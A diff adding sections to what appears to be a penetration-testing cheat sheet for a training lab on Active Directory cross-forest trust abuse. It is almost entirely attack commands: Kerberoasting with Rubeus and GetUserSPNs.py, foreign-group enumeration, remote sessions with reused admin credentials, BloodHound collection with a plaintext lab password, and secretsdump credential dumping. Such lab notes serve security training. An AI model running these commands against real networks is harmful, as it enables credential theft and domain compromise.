@@ -84,3 +84,44 @@ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.loc
 raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
 
 secretsdump.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5 | grep "bross"
+```
+
+### Domain Trusts - Cross-Forest Trust Abuse - from Windows
+```
+# Cross-Forest Kerberoasting
+
+## Enumerating Accounts for Associated SPNs Using Get-DomainUser
+Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+
+## Enumerate SPN User
+Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity USER |select samaccountname,memberof
+
+## Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+
+# Admin Password Re-Use & Group Membership
+
+## Using Get-DomainForeignGroupMember
+Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+
+## Accessing DC03 Using Enter-PSSession
+Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+```
+
+### Domain Trusts - Cross-Forest Trust Abuse - from Linux
+```
+# Using GetUserSPNs.py
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+# Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
+cat /etc/resolv.conf
+domain INLANEFREIGHT.LOCAL
+
+# Hunting Foreign Group Membership with Bloodhound-python
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+zip -r ilfreight_bh.zip *.json
+
+bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
+```
